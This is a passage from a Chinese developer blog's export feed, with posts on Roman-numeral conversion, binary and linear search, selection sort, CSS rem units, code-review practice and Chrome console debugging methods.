    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>罗马数字包含以下七种字符: I， V， X， L，C，D 和 M。<br>|  字符   | 数值  |<br>|  —-  | —-  |<br>|I         |    1|<br>|V        |     5|<br>|X        |     10|<br>|L        |     50|<br>|C        |     100|<br>|D       |      500|<br>|M         |    1000|</p>
<blockquote>
<p>例如， 罗马数字 2 写做 II ，即为两个并列的 1。12 写做 XII ，即为 X + II 。 27 写做  XXVII, 即为 XX + V + II 。</p>
</blockquote>
<p>通常情况下，罗马数字中小的数字在大的数字的右边。但也存在特例，例如 4 不写做 IIII，而是 IV。数字 1 在数字 5 的左边，所表示的数等于大数 5 减小数 1 得到的数值 4 。同样地，数字 9 表示为 IX。这个特殊的规则只适用于以下六种情况：</p>
<ul>
<li>I 可以放在 V (5) 和 X (10) 的左边，来表示 4 和 9。</li>
<li>X 可以放在 L (50) 和 C (100) 的左边，来表示 40 和 90。 </li>
<li>C 可以放在 D (500) 和 M (1000) 的左边，来表示 400 和 900。</li>
<li>给定一个罗马数字，将其转换成整数。输入确保在 1 到 3999 的范围内。</li>
</ul>
<h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * @param &#123;string&#125; s</span><br><span class="line"> * @return &#123;number&#125;</span><br><span class="line"> *&#x2F;</span><br><span class="line">var romanToInt &#x3D; function(s) &#123;</span><br><span class="line">    const map &#x3D; &#123;</span><br><span class="line">        I : 1,</span><br><span class="line">        IV: 4,</span><br><span class="line">        V: 5,</span><br><span class="line">        IX: 9,</span><br><span class="line">        X: 10,</span><br><span class="line">        XL: 40,</span><br><span class="line">        L: 50,</span><br><span class="line">        XC: 90,</span><br><span class="line">        C: 100,</span><br><span class="line">        CD: 400,</span><br><span class="line">        D: 500,</span><br><span class="line">        CM: 900,</span><br><span class="line">        M: 1000</span><br><span class="line">    &#125;;</span><br><span class="line">    let ans &#x3D; 0;</span><br><span class="line">    for(let i &#x3D; 0;i &lt; s.length;) &#123;</span><br><span class="line">        if(i + 1 &lt; s.length &amp;&amp; map[s.substring(i, i+2)]) &#123;</span><br><span class="line">            ans +&#x3D; map[s.substring(i, i+2)];</span><br><span class="line">            i +&#x3D; 2;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            ans +&#x3D; map[s.substring(i, i+1)];</span><br><span class="line">            i ++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return ans;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-ee76edd2092de74c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
]]></content>
      <categories>
        <category>algorithm</category>
      </categories>
  </entry>
  <entry>
    <title>算法——二分法查找（binarySearch）</title>
    <url>/nirvana/algorithm/%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/%E7%AE%97%E6%B3%95%E2%80%94%E2%80%94%E4%BA%8C%E5%88%86%E6%B3%95%E6%9F%A5%E6%89%BE%EF%BC%88binarySearch%EF%BC%89/</url>
    <content><![CDATA[<p>二分法查找，也称为折半法，是一种在有序数组中查找特定元素的搜索算法。</p>
<p>二分法查找的思路如下：<br>（1）首先，从数组的中间元素开始搜索，如果该元素正好是目标元素，则搜索过程结束，否则执行下一步。<br>（2）如果目标元素大于/小于中间元素，则在数组大于/小于中间元素的那一半区域查找，然后重复步骤（1）的操作。<br>（3）如果某一步数组为空，则表示找不到目标元素。<br>这种搜索算法每一次比较都使搜索范围缩小一半。时间复杂度<code>O(logn)</code>。</p>
<h5 id="非递归写法"><a href="#非递归写法" class="headerlink" title="非递归写法"></a>非递归写法</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * 二分法查找</span><br><span class="line"> * @param &#123;array[T]&#125; arr 查询数组</span><br><span class="line"> * @param &#123;T&#125; key 查找对象</span><br><span class="line"> *&#x2F;</span><br><span class="line">function binarySearch(arr, key) &#123;</span><br><span class="line">  var start &#x3D; 0; &#x2F;&#x2F;数组最小索引值</span><br><span class="line">  var end &#x3D; arr.length - 1; &#x2F;&#x2F;数组最大索引值</span><br><span class="line">  while (start &lt;&#x3D; end) &#123;</span><br><span class="line">    var mid &#x3D; Math.floor((start + end) &#x2F; 2);</span><br><span class="line">    if (key &#x3D;&#x3D; arr[mid]) &#123;</span><br><span class="line">      return mid;</span><br><span class="line">    &#125; else if (key &gt; arr[mid]) &#123;</span><br><span class="line">      start &#x3D; mid + 1;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      end &#x3D; mid - 1;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return null; &#x2F;&#x2F;start&gt;end的情况，这种情况下key的值大于arr中最大的元素值或者key的值小于arr中最小的元素值</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="递归写法"><a href="#递归写法" class="headerlink" title="递归写法"></a>递归写法</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * 递归方式二分法查询</span><br><span class="line"> * @param &#123;array[T]&#125; arr 查询数组</span><br><span class="line"> * @param &#123;number&#125; start 开始位置</span><br><span class="line"> * @param &#123;number&#125; end 结束位置</span><br><span class="line"> * @param &#123;T&#125; key 查找对象</span><br><span class="line"> *&#x2F;</span><br><span class="line">function binarySearch(arr, start, end, key) &#123;</span><br><span class="line">  if (start &gt; end) &#123;</span><br><span class="line">    return null;</span><br><span class="line">  &#125;</span><br><span class="line">  var mid &#x3D; Math.floor((start + end) &#x2F; 2);</span><br><span class="line">  if (key &#x3D;&#x3D; arr[mid]) &#123;</span><br><span class="line">    return mid;</span><br><span class="line">  &#125; else if (key &lt; arr[mid]) &#123;</span><br><span class="line">    end &#x3D; mid - 1;</span><br><span class="line">    return binarySearch(arr, start, end, key);</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    start &#x3D; mid + 1;</span><br><span class="line">    return binarySearch(arr, start, end, key);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>algorithm</category>
      </categories>
  </entry>
  <entry>
    <title>线性查找</title>
    <url>/nirvana/algorithm/%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/%E7%BA%BF%E6%80%A7%E6%9F%A5%E6%89%BE/</url>
    <content><![CDATA[<p><strong>线性查找</strong>又称顺序查找，是一种最简单的查找方法，它的基本思想是从第一个记录开始，逐个比较记录的关键字，直到和给定的K值相等，则查找成功；若比较结果与文件中n个记录的关键字都不等，则查找失败。<br><strong>算法思想：</strong>目标元素值挨个与数组元素比较，直达找到目标元素为止。<br><strong>算法优点：</strong>实现简单，应用范围广。<br><strong>算法缺点：</strong>效率极低，需要一个元素一个元素的比较，最坏情况下需要把数组中的元素都比较一遍。时间复杂度<code>O(n)</code></p>
<h5 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function seqSearch(arr, value) &#123;</span><br><span class="line">    &#x2F;&#x2F;线性查找是逐一比对，发现有相同值，就返回下标</span><br><span class="line">    for (let i &#x3D; 0; i &lt; arr.length; i++) &#123;</span><br><span class="line">        if (arr[i] &#x3D;&#x3D;&#x3D; value) &#123;</span><br><span class="line">            return i</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return -1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>algorithm</category>
      </categories>
  </entry>
  <entry>
    <title>选择排序</title>
    <url>/nirvana/algorithm/%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/%E9%80%89%E6%8B%A9%E6%8E%92%E5%BA%8F/</url>
    <content><![CDATA[<p>选择排序的思想其实和冒泡排序有点类似，都是在一次排序后把最小的元素放到最前面。但是过程不同，冒泡排序是通过相邻的比较和交换。而选择排序是通过对整体的选择。<br>举个栗子，对5,3,8,6,4这个无序序列进行简单选择排序，首先要选择5以外的最小数来和5交换，也就是选择3和5交换，一次排序后就变成了3,5,8,6,4.对剩下的序列一次进行选择和交换，最终就会得到一个有序序列。<br>其实选择排序可以看成冒泡排序的优化，因为其目的相同，只是选择排序只有在确定了最小数的前提下才进行交换，大大减少了交换的次数。选择排序的时间复杂度为O(n^2)。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * 选择排序，每次先选择一个最小的，放到前面</span><br><span class="line"> * @param &#123;Array&lt;Number&gt;&#125; arry 要排序的数组</span><br><span class="line"> *&#x2F;</span><br><span class="line">function SelectSort(arry: Array&lt;Number&gt;): Array&lt;Number&gt; &#123;</span><br><span class="line">    if (arry.length &#x3D;&#x3D; 0) &#123;&#x2F;&#x2F;判断数组不为空</span><br><span class="line">        return [];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    for (let i &#x3D; 0; i &lt; arry.length - 1; i++) &#123;&#x2F;&#x2F;从0开始,只需要比较n-1次</span><br><span class="line">        for (let j &#x3D; i + 1; j &lt; arry.length; j++) &#123;&#x2F;&#x2F;比较从i+1开始</span><br><span class="line">            if (arry[i] &gt; arry[j]) &#123;&#x2F;&#x2F;交换</span><br><span class="line">                let temp &#x3D; arry[i];</span><br><span class="line">                arry[i] &#x3D; arry[j];</span><br><span class="line">                arry[j] &#x3D; temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        console.log(JSON.stringify(arry))</span><br><span class="line">    &#125;</span><br><span class="line">    return arry;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SelectSort([8,7,6,5,4]);</span><br><span class="line"> [4,8,7,6,5]</span><br><span class="line"> [4,5,8,7,6]</span><br><span class="line"> [4,5,6,8,7]</span><br><span class="line"> [4,5,6,7,8]</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>algorithm</category>
      </categories>
  </entry>
  <entry>
    <title>CSS3的REM设置字体</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/CSS3%E7%9A%84REM%E8%AE%BE%E7%BD%AE%E5%AD%97%E4%BD%93/</url>
    <content><![CDATA[<p>在Web中使用什么单位来定义页面的字体大小，至今天为止都还在激烈的争论着，有人说PX做为单位好，有人说EM优点多，还有人在说百分比方便，以至于出现了CSS Font-Size: em vs. px vs. pt vs. percent这样的PK大局。不幸的是，仍然有不同的利弊，使各种技术都不太理想，但又无法不去用。真是进也难，退也难呀。</p>
<p>最近在学习em的相关知识的时候，无意之间让我拾得一宝，就是使用rem来设置Web页面的字体大小。让我一下子就来劲了，一口气看完并测试了一回，还真是爽歪歪的呀。师傅说好东西不能吃独食，于我就在这里给大家吹吹这个从没见过的REM。</p>
<p>在详细介绍rem之前，我们先一起来回顾一下我们常用的两种记量单位，也是备受争论的两个：</p>
<p>1、PX为单位</p>
<p>2、EM为单位</p>
<p>PX为单位<br>在Web页面初期制作中，我们都是使用“px”来设置我们的文本，因为他比较稳定和精确。但是这种方法存在一个问题，当用户在浏览器中浏览我们制作的Web页面时，他改变了浏览器的字体大小，这时会使用我们的Web页面布局被打破。这样对于那些关心自己网站可用性的用户来说，就是一个大问题了。因此，这时就提出了使用“em”来定义Web页面的字体。</p>
<p>em为单位<br>前面也说了，使用是“px”为单位是比较方便，而又一致，但在浏览器中放大或缩放浏览页面时会存在一个问题，要解决这个问题，我们可以使用“em”单位。Richard Rutter’在《How to size text using ems》一文中有做过详细的介绍，追至早一点，Richard Rutter也在《How to Size Text in CSS》中进行过深入的剖析。</p>
<p>这种技术需要一个参考点，一般都是以的“font-size”为基准。比如说我们使用“1em”等于“10px”来改变默认值“1em=16px”，这样一来，我们设置字体大小相当于“14px”时，只需要将其值设置为“1.4em”。</p>
<p>body {</p>
<p>font-size: 62.5%;/<em>10 ÷ 16 × 100% = 62.5%</em>/</p>
<p>}</p>
<p>h1 {</p>
<p>font-size: 2.4em; /*2.4em × 10 = 24px */</p>
<p>}</p>
<p>p {</p>
<p>font-size: 1.4em; /*1.4em × 10 = 14px */</p>
<p>}</p>
<p>li {</p>
<p>font-size: 1.4em; /*1.4 × ? = 14px ? */</p>
<p>}</p>
<p>为什么“li”的“1.4em”是不是“14px”将是一个问号呢？如果你了解过“em”后，你会觉得这个问题是多问的。前面也简单的介绍过一回，在使用“em”作单位时，一定需要知道其父元素的设置，因为“em”就是一个相对值，而且是一个相对于父元素的值，其真正的计算公式是：</p>
<p>1 ÷ 父元素的font-size × 需要转换的像素值 = em值</p>
<p>这样的情况下“1.4em”可以是“14px”,也可以是“20px”，或者说是“24px”，总之是一个不确定值，那么解决这样的问题，要么你知道其父元素的值，要么呢在任何子元素中都使用“1em”。这样一来可能又不是我们所需要的方法。</p>
<p>这里我只是简单的介绍了一个这两个单位的使用，具体一点的大家可以参阅：</p>
<p>Best Practices的站长Kyle的《CSS Font-Size: em vs. px vs. pt vs. percent》</p>
<p>Converting px into percentage and em for relative CSS font sizes</p>
<p>Em Vs Percent Widths</p>
<p>CSS: Units of Measurement</p>
<p>Jennifer Kyrnin的Using Points, Pixels, Ems, or Percentages for CSS Fonts</p>
<p>Rem为单位</p>
<p>  CSS3的出现，他同时引进了一些新的单位，包括我们今天所说的rem。在W3C官网上是这样描述rem的——“font size of the root element” 。下面我们就一起来详细的了解rem。</p>
<p>前面说了“em”是相对于其父元素来设置字体大小的，这样就会存在一个问题，进行任何元素设置，都有可能需要知道他父元素的大小，在我们多次使用时，就会带来无法预知的错误风险。而rem是相对于根元素，这样就意味着，我们只需要在根元素确定一个参考值，，在根元素中设置多大的字体，这完全可以根据您自己的需，大家也可以参考下图：</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-a9ca7cd8c5a5eb5f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>我们来看一个简单的代码实例：</p>
<p>html {font-size: 62.5%;/<em>10 ÷ 16 × 100% = 62.5%</em>/}  </p>
<p>body {font-size: 1.4rem;/*1.4 × 10px = 14px */}  </p>
<p>h1 { font-size: 2.4rem;/<em>2.4 × 10px = 24px</em>/}</p>
<p>我在根元素中定义了一个基本字体大小为62.5%（也就是10px。设置这个值主要方便计算，如果没有设置，将是以“16px”为基准 ）。从上面的计算结果，我们使用“rem”就像使用“px”一样的方便，而且同时解决了“px”和“em”两者不同之处。</p>
<p>浏览器的兼容性<br>rem是CSS3新引进来的一个度量单位，大家心里肯定会觉得心灰意冷呀，担心浏览器的支持情况。其实大家不用害怕，你可能会惊讶，支持的浏览器还是蛮多的，比如：Mozilla Firefox 3.6+、Apple Safari 5+、Google Chrome、IE9+和Opera11+。只是可怜的IE6-8无法，你们就把他们当透明了吧，我向来都是如此。</p>
<p>不过使用单位设置字体，可不能完全不考虑IE了，如果你想使用这个REM，但也想兼容IE下的效果，可你可考虑“px”和“rem”一起使用，用”px”来实现IE6-8下的效果，然后使用“Rem”来实现代浏览器的效果。就让IE6-8不能随文字的改变而改变吧，谁让这个Ie6-8这么二呢？哈。。。。大家不仿试试，还蛮有意思，说不定这个就是主流的度量单位了。、</p>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>CodeReview总结</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/CodeReview%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>我们时常会听到团队成员说：</p>
<ul>
<li>“这个项目搞代码审查简直是在浪费时间。”</li>
<li>“我没时间做代码审查。”</li>
<li>“发布会延迟，是因为我那个卑鄙的同事还没有审查过我的代码。”</li>
<li>“你能相信我的同事居然要求我改我的代码吗？我这么优雅完美的代码哪里还需要改呢。”</li>
</ul>
<h2 id="我们为什么要做代码审查？"><a href="#我们为什么要做代码审查？" class="headerlink" title="我们为什么要做代码审查？"></a><strong>我们为什么要做代码审查？</strong></h2><p>任何专业的软件开发人员其最重要的目标之一就是要不断提高自己的工作质量。但是只有团队协作才能力往一处使，劲往一处用，提高软件质量。代码审查是实现这一目标最重要的途径之一。特别是，代码审查可以：</p>
<ul>
<li>  从另一个角度发现缺陷和更好的解决办法。</li>
<li>  确保至少另外还有一人熟悉你的代码。</li>
<li>  通过翻阅资深开发人员的代码，帮助培训新员工。</li>
<li>  促进知识共享。</li>
<li>  激励开发人员更好地写代码、解决代码中的问题，以免在审查时被别人揪出来。</li>
</ul>
<h2 id="代码审查要彻底"><a href="#代码审查要彻底" class="headerlink" title="代码审查要彻底"></a><strong>代码审查要彻底</strong></h2><p>然而，除非能实实在在彻彻底底地在代码审查上花时间和精力，否则上述目标是很难实现的。</p>
<p>我的看法是大概25％的原始开发时间应该花在代码审查上。举个例子，如果一个开发人员需要用两天时间来实现某个程式，那么就应该花大约4小时进行审查。</p>
<p>当然时间并不是最重要的，关键是要看你能否正确审查代码。你必须了解你正在审查的代码。这意味着你不仅仅要知道它的的语法，还必须理解代码是如何融入应用程序这个大环境下，成为组件或库的一部分。如果你不能把握每一行代码的含义，那么你的审查就不到位，也不会非常有价值。这也是为什么良好执行的代码审查，大多不可能迅速被完成：因为我们需要时间来研究各种代码，如能触发给定功能以确保第三方API正确使用的代码。</p>
<p>在审查时，除了要寻找代码缺陷和其他问题，你还应该确保：</p>
<ul>
<li>  囊括所有必要的测试。</li>
<li>  已经写入了恰当的设计文档。</li>
</ul>
<p>即使是那些擅于写测试和文档的开发人员，也会在改变代码的时候忘记更新。代码评审时就应该确保这些资料不会随着时间而变得毫无用处。</p>
<h2 id="避免过度的代码审查"><a href="#避免过度的代码审查" class="headerlink" title="避免过度的代码审查"></a><strong>避免过度的代码审查</strong></h2><p>开发人员应该努力清空积压的审查任务。有一种方法是在早上代码审查，在开始自己的开发工作之前先搞定审查任务。当然你也可以午饭前后或者是一天结束之时审查代码。总而言之，你应该将代码当作是日常工作的一部分，而不是工作的负累，所以你应该避免：</p>
<ul>
<li>  没有时间处理积压的审查任务。</li>
<li>  由于审查的没有完成而导致了延迟发布。</li>
<li>  傻乎乎地再去审查已经不相干的代码，在交给你之后已经被改的面目全非。</li>
<li>  因为时间紧迫急急忙忙地走个过场。</li>
</ul>
<h2 id="编写可审查的代码"><a href="#编写可审查的代码" class="headerlink" title="编写可审查的代码"></a><strong>编写可审查的代码</strong></h2><p>出现代码积压而失控的问题，审查人员并不是唯一一个需要负责的人。举个例子，如果你的同事花了一周时间为一个大型程序添加了乱七八糟的代码，那么发布的补丁就会变得很难审查，有太多的内容需要理解和钻研。甚至于连代码目的和基本架构都看得云里雾里。这是写代码的不是。</p>
<p>在编写可审查的代码之前，还需要做一些准备。如果需要做一些棘手的架构决策，那么最好和审查人员先讨论一番。这将能让你的代码更容易审阅和理解，因为他们提前已经知道你想实现什么以及计划如何实现。这也可以避免，要是审查人员之后提出一个截然不同又更好的方法，而导致你不得不重写一大片代码的情况。</p>
<p>项目架构应该在设计文档中详细描述。这很重要，因为它能让新的项目人员更快地理解现有的代码库，还能有助于审查人员更好地完成他们的工作。此外，单元测试能让审查人员更好地理解各个组件的使用。</p>
<p>如果在你的补丁中还包含了第三方代码，那么单独提交。试想一下，要是代码中间插进去9000行jQuery，是不是大大增加了审查的难度！</p>
<p>创建可审查代码最重要的步骤之一就是给你的代码审查做注释。这需要你自己预先审查过，然后在你认为有助于审查人员理解的地方添加注释。我发现，注释后的代码审查所需的时间相对较短（通常只需几分钟）。当然，代码注释还是应该酌情使用。此外，有研究表明，开发人员自己在给代码注释的时候也会发现许多存在的缺陷。</p>
<h2 id="代码重构"><a href="#代码重构" class="headerlink" title="代码重构"></a><strong>代码重构</strong></h2><p>有时候，我们必须重构代码库。如果恰巧碰到的是一个大型的应用程序，那可能就会需要几天的时间（甚至更多），同时会产生大量的补丁。在这种情况下，想要做到标准流程的代码评审可能是不切实际的。</p>
<p>最好的解决办法是逐步重构代码。先给定一个合理范围，确定相应的代码库，然后朝着目标方向做整改和重构。第一部分完成之后，审查并发布，然后进行第二部分的重构……，直到全部完成。这种阶段式的方法可能并不总是可行的，但是如果我们在思考和规划时使用这样的方法，可以避免重构时大规模的单片补丁。当然这种方式可能需要的重构时间更多，但是也会产出更高质量的代码，以及更加轻松的审查过程。</p>
<h2 id="解决争端"><a href="#解决争端" class="headerlink" title="解决争端"></a><strong>解决争端</strong></h2><p>毫无疑问，团队中的每个成员都是人才，但是这也很容易导致在面对特定的编码问题时，会出现意见分歧的情况。作为开发人员，我们应该保持开放的态度，并且也要能虚心接受审查人员给出的不同意见。</p>
<p>而作为审查人员，说话要委婉。在提建议之前，先考虑一下你的意见是否真的更好或者仅仅只是因为品味不同而已。如果你选择的代码区域确实需要改进的，那么整个说服过程就会简单得多。并且话要这样讲，“这里还值得考虑一下……”，“有人建议说……”，而不是“我闭着眼睛写的算法也能比你的高效。”</p>
<p>当然如果你们双方都不肯妥协的话，可以要求你们都尊重的开发人员来看一看，给出他的意见。<br>译文链接：<a href="http://www.codeceo.com/article/code-review-5-tips.html">http://www.codeceo.com/article/code-review-5-tips.html</a><br>英文原文：<a href="https://medium.com/@salsita/practical-lessons-in-peer-code-review-b4dbc84e88d3">Practical Lessons in Peer Code Review</a></p>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>Console新学习</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/Console%E6%96%B0%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>接着上一篇<a href="/nirvana/javascript/%E5%89%8D%E7%AB%AF/%E5%89%8D%E7%AB%AF%E5%AE%9E%E7%94%A8%E7%9A%84%E8%B0%83%E8%AF%95%E5%91%BD%E4%BB%A4console%E4%BD%BF%E7%94%A8">前端实用的调试命令console使用</a></p>
<h4 id="查看所有方法"><a href="#查看所有方法" class="headerlink" title="查看所有方法"></a>查看所有方法</h4><p><code>console</code> 除了上面的几个方法还有什么方法呢？<code>log</code> 除了能打印字符串外，还能打印出对象，我们可以利用 <code>console.log</code> 打印自己。</p>
<p>代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">console.log(console);</span><br></pre></td></tr></table></figure>

<p>输出：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Object &#123;</span><br><span class="line">    assert: ...,</span><br><span class="line">    clear: ...,</span><br><span class="line">    count: ...,</span><br><span class="line">    debug: ...,</span><br><span class="line">    dir: ...,</span><br><span class="line">    dirxml: ...,</span><br><span class="line">    error: ...,</span><br><span class="line">    group: ...,</span><br><span class="line">    groupCollapsed: ...,</span><br><span class="line">    groupEnd: ...,</span><br><span class="line">    info: ...,</span><br><span class="line">    log: ...,</span><br><span class="line">    markTimeline: ...,</span><br><span class="line">    profile: ...,</span><br><span class="line">    profileEnd: ...,</span><br><span class="line">    table: ...,</span><br><span class="line">    time: ...,</span><br><span class="line">    timeEnd: ...,</span><br><span class="line">    timeStamp: ...,</span><br><span class="line">    timeline: ...,</span><br><span class="line">    timelineEnd: ...,</span><br><span class="line">    trace: ...,</span><br><span class="line">    warn: ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面的 <code>console</code> 是 <code>chrome浏览器</code>中打印出来的 。<br>我们可以在 <code>开发环境</code> 中，<code>合理的利用</code> 这些方法来帮助我们开发。</p>
<h4 id="十一：清理控制台"><a href="#十一：清理控制台" class="headerlink" title="十一：清理控制台"></a>十一：清理控制台</h4><p>如果我们在控制台调试的时候。浏览器和命令行 <code>clear</code> 一样提供了一个清理函数 <code>console.clear()</code> 。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">console.clear()</span><br></pre></td></tr></table></figure>

<p>当然我们也可以用 <code>chrome</code> 的 <code>command line api</code> 来清理控制台。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">clear()</span><br></pre></td></tr></table></figure>

<p>又或者可以使用按键Mac上 <code>cmd + k</code> ，Win <code>ctrl + l</code>（我用的是<code>chrome浏览器</code>）。</p>
<h4 id="十二：分组并展开"><a href="#十二：分组并展开" class="headerlink" title="十二：分组并展开"></a>十二：分组并展开</h4><p>当代码非常长，或者我们需要把一个函数，或者一个文件中的函数等区分出来。我们可以使用分组来实现。<br>上一篇用group可以分组，但是每次都要手动展开，我们可以使用 <code>console.groupCollapsed</code> ，用法和 <code>console.group</code> 类似。</p>
<p>代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">console.group(&#39;人&#39;);</span><br><span class="line">console.log(&quot;手&quot;);</span><br><span class="line">console.log(&quot;脚&quot;);</span><br><span class="line">console.groupEnd();</span><br><span class="line"></span><br><span class="line">console.group(&#39;修仙&#39;);</span><br><span class="line">console.log(&quot;法力无边&quot;);</span><br><span class="line">console.log(&quot;腾云架雾&quot;);</span><br><span class="line">console.groupEnd();</span><br></pre></td></tr></table></figure>

<p>输出：</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-88f3c68fa9f3197c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>##十三：查看运行堆栈</p>
<p> <code>console.trace</code> 可以看透运行时的结果栈。<br>代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function add(num) &#123;</span><br><span class="line">    if (0 &lt; num) &#123;</span><br><span class="line">        console.trace(&quot;现在num的值为&quot;, num);</span><br><span class="line">        return num + add(num - 1);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var a &#x3D;3;</span><br><span class="line">add(3);</span><br></pre></td></tr></table></figure>

<p>输出：</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-111b03c67baabdb6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<h4 id="十四：统计次数"><a href="#十四：统计次数" class="headerlink" title="十四：统计次数"></a>十四：统计次数</h4><p>有时候我们需要统计一个函数或者被调用了几次，我们通常会增加一个变量 <code>count</code> 来记录，然后在控制台中查看。这样相当的麻烦，我们可以使用 <code>console.count</code> 函数来帮忙我们记录次数，并输出。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function hi(name) &#123;</span><br><span class="line">    console.count(name);</span><br><span class="line">    return &quot;hi &quot; + name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for(var i &#x3D; 0; i &lt; 10; i++) &#123;</span><br><span class="line">    if(i &lt; 4) &#123;</span><br><span class="line">        hi(&quot;person&quot;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        hi(&quot;god&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">person: 1</span><br><span class="line">person: 2</span><br><span class="line">person: 3</span><br><span class="line">person: 4</span><br><span class="line">god: 1</span><br><span class="line">god: 2</span><br><span class="line">god: 3</span><br><span class="line">god: 4</span><br><span class="line">god: 5</span><br><span class="line">god: 6</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>FP-RP-FRP编程范式</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/FP-RP-FRP%E7%BC%96%E7%A8%8B%E8%8C%83%E5%BC%8F/</url>
    <content><![CDATA[<p><img src="https://upload-images.jianshu.io/upload_images/10024246-e551555c2919e46c.jpeg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-837712d823c88c44.jpeg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-7ab8e5e5c0fa23fa.jpeg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-820693fcfaded8bc.jpeg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-0dd0666c417ff235.jpeg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<blockquote>
<p>数据和视图的分离-&gt;解耦（开放封闭原则）jq的数据与视图混在一块（意大利面条式代码），Vue的数据与视图分离 以数据驱动视图（只关心数据变化，DOM操作被封装）jq直接用js修改视图，Vue以数据驱动视图</p>
</blockquote>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-42d5fd6651b5c730.jpeg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-c4476563b9f416e1.jpeg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-61c4c317ab6a1925.jpeg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-1b0d1dad4068ccde.jpeg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-488439027be1a632.jpeg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-11073c21bc77376b.jpeg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
